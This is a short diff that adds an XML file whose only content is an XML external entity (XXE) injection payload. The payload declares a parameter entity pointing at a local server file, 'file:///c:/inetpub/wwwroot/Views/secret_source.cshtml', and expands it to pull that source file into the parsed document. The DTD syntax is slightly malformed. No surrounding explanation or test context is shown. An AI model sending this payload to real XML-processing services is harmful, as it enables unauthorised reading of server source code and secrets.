@@ -1,0 +1,7 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE demo [
+     [<!ELEMENT demo ANY >
+     <!ENTITY % extentity SYSTEM "file:///c:/inetpub/wwwroot/Views/secret_source.cshtml">
+     %extentity;
+     ]
+>
